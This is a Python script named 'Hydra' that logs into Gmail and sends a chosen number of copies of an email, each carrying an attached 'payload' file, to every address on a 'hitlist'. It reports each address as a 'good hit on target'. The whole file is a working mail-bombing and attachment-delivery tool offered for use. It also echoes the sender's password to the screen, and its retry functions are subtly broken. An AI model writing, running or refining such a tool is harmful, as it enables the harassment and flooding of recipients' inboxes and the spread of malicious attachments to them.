import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.message import EmailMessage
import os.path
from os import path
from colorama import *
from getpass import *

init()

def Intro():

    #Initial Bootup
    print()
    print(Back.RED + "Booting Hydra systems..." + Style.RESET_ALL)
    print(Back.RED + "....................................................." + Style.RESET_ALL)
    print(Back.RED + "....................................................." + Style.RESET_ALL)
    print(Back.RED + "....................................................." + Style.RESET_ALL)
    print()
    print("Welcome to the Hydra Launch System...")
    print("This program is designed to be used in conjunction with Google mail.")
    print()

#Pretty much is what it is.
def AccessGranted():

    print(Back.GREEN + "Security check passed." + Style.RESET_ALL)
    print()
    print(Back.GREEN + "Initiating project Hydra..." + Style.RESET_ALL)
    print()

#Verify sender email information
def EmailCredentials():

    #Server type warning
    print("Please note: Hydra protocols collaborate with google mail servers only.")
    print()
    print("Administrator must set priveleges to allow 3rd party access.")
    print()

    #Collect sender information
    SenderEmail = input('Enter the email address to be used: ')
        
    EmailQual1 = '@'
    if EmailQual1 in SenderEmail:
        print()
        print(Back.GREEN + 'Valid email...' + Style.RESET_ALL)
        print()
        SP1 = input('Enter the email password to be used: ')
        SP2 = input('Re-Enter email password: ')
        print()

        if SP1 == SP2:
            print(Back.GREEN + "Password match" + Style.RESET_ALL)
            SenderPassword = SP1
            return SenderEmail, SenderPassword
            print()

        else:
            print(Back.RED + 'Initial password does not match re-entry...' + Style.RESET_ALL)
            print(Back.RED + 'Try again...' + Style.RESET_ALL)
            print()
            EmailCredentials()
    else:
        print()
        print(Back.RED + 'Invalid email type!' + Style.RESET_ALL)
        print(Back.RED + 'Try again...' + Style.RESET_ALL)
        EmailCredentials()

#Function for collection emails.
def HitlistCollector():

    print()
    print('Hitlists must be in .txt format.')
    Hitlist = input('Enter Target hitlist file name: ')
    print()
    
    #Boolean holds true or false variable
    FPE = os.path.exists(Hitlist)
    
    if FPE == True:
        with open(Hitlist, 'r') as f:
            MHL= [line.strip() for line in f]
            print(Back.GREEN + 'Hitlist File contents consumed...' + Style.RESET_ALL)
            print(Back.CYAN)
            print(MHL)
            print(Style.RESET_ALL)
            return MHL

    else:
        print(Back.RED + 'File Path does not exist..please try again.' + Style.RESET_ALL)
        HitlistCollector()
#Function for collecting payload.
def PayloadCollector():

    print()
    print("Payload file name should be fully typed with '.filetype' and located in Hydra folder.")
    PL = input('Input payload file name: ')
    print()

    PLE = os.path.exists(PL)

    if PLE == True:
        with open(PL, 'rb') as AttachedFile:
            FD = AttachedFile.read()
            FN = AttachedFile.name
            return FD,FN

    else:
        print(Back.RED + "Payload not found." + Style.RESET_ALL)
        print(Back.RED + 'Please Try again...' + Style.RESET_ALL)
        print()
        PayloadCollector()

#Function to collection subject line
def SubjectCollector():

    S = input('Enter Subject line: ')
    Ays = input('Are you sure? Y or N: ')
    a = Ays.lower()
    if a == "y":
        print(Back.GREEN + 'Subject line complete.' + Style.RESET_ALL)
        print()
        return S

    else:
        print(Back.RED + 'Try again..' + Style.RESET_ALL)
        print()
        SubjectCollector()

#Function to collect body of email.
def MsgCollector():

    print('Is the message body contained in a .txt file, or will you be typing one manually? ')
    Ans = input('Choice (Manual or File name): ')
    a = Ans.lower()
    
    if Ans == "manual":
        M = input('Type message body: ')
        Ays = input('Are you sure? Y or N: ')
        a = Ays.lower()
       
        if Ays == "y":
            print(Back.GREEN + 'Message body complete.' + Style.RESET_ALL)
            return M

        else:
            print(Back.RED + 'Try again..' + Style.RESET_ALL)
            MsgCollector()
    else:
        if os.path.exists(Ans):
            
            print(Back.GREEN + 'File Found' + Style.RESET_ALL)
            print()
            with open(Ans, 'r') as Body:
                M = Body.read()
                Ays = input('Final choice? Y or N: ')
                a = Ays.lower()

                if Ays == "y":
                    print(Back.GREEN + 'Message body complete.' + Style.RESET_ALL)
                    return M

                else:
                    print(Back.RED + 'Try again..' + Style.RESET_ALL)
                    MsgCollector()
        else:
            print(Back.RED + 'Try again..' + Style.RESET_ALL)
            MsgCollector()
   

def SequenceCollector():

    N = input('Enter number of desired emails per Hitlist member: ')

    if N.isdigit():
        Ays = input('Are you sure? Y or N: ')
        a = Ays.lower()

        if Ays == "y":
            print(Back.GREEN + 'Payload sequence complete.' + Style.RESET_ALL)
            print()
            return N

        else:
            print('Try again..')
            print()
            SequenceCollector()
    else:
        print(Back.RED + 'Value entered is not a digit, try again...' + Style.RESET_ALL)
        print()
        SequenceCollector()

#Confirm this is what they want to do.
def ConfirmLaunch():

    print()
    print(Back.YELLOW + 'Once project Hydra commences it cannot be stopped..' + Style.RESET_ALL)
    print()
    Ans = input('Launch Hydra Y or N?: ')
    a = Ans.lower()

    if a == "y":
        return bool(1) #Returns True

    else:
        return bool(0) #Returns False

def Disengage():
    print(Back.RED + 'Project Hydra aborted.' + Style.RESET_ALL)
    print(Back.RED + 'System disengaging...' + Style.RESET_ALL)
    input()

def MissionComplete():

    print(Back.GREEN + 'Mission complete..' + Style.RESET_ALL)
    print()
    print(Back.RED + 'Project Hydra shutting down' + Style.RESET_ALL)
    input()
    
def Main():

    Intro()

    #This used to check password. No longer needs if else. just set to 1=1 to always run
    if 1 == 1:

        AccessGranted()
        
        #Function returns both in tuple form
        SenderEmail,SenderPassword = EmailCredentials()
        print()
        print('Chosen Sender Credentials: ')
        print(Back.CYAN + SenderEmail + Style.RESET_ALL)
        print(Back.CYAN + SenderPassword + Style.RESET_ALL)
        print()
        print("Make sure all utilized hitlist files and payload files are placed within the Hydra Folder.")
        print()
        MyHitlist = HitlistCollector()

        #Collect header and body information
        Sub = SubjectCollector()
        Msg = MsgCollector()
        
        # Assign variables to designated positions
        Message = EmailMessage()
        Message['Subject'] = Sub
        Message['From'] = SenderEmail
        Message.set_content(Msg)
        
        #Collect payload information
        File_Data,File_Name = PayloadCollector()

        #Add payload to message attachment key
        Message.add_attachment(File_Data, maintype = 'application', subtype = 'octete-stream', filename = File_Name)
        
        #At this point payload and hitlist should be ready to go. 
        #Ask for go ahead.
        print(Back.GREEN + "Payload built Successfully." + Style.RESET_ALL)
        
        iteration = int(SequenceCollector())
        count = 0

        print()
        print(Back.GREEN + "Hydra is ready for launch.." + Style.RESET_ALL)
        print()
        
        #Make sure they want to go ahead
        CL = ConfirmLaunch()
        
        if CL == True:
        
            for HitlistMember in MyHitlist:
            
                #Reset the count after each hitlist member is complete
                count = 0
                #port to be used for ssl connections
                port = 465

                with smtplib.SMTP_SSL('smtp.gmail.com', port) as smtp:
                    
                    Message["To"] = HitlistMember
                    smtp.login(SenderEmail, SenderPassword)
                    print()
                    print(Back.GREEN + 'Connection successful.' + Style.RESET_ALL)
                    print()

                    while count != iteration:
                        # Login with credentials
                        print(Back.YELLOW + 'Splash out!!' + Style.RESET_ALL)
                        smtp.send_message(Message)
                        count += 1

                    smtp.quit()
                    del Message['To']
                    print(Back.GREEN + 'Good hit on target: ' + HitlistMember)
                    print( Style.RESET_ALL)
        
        else:
            Disengage()

    MissionComplete()
    input()

Main()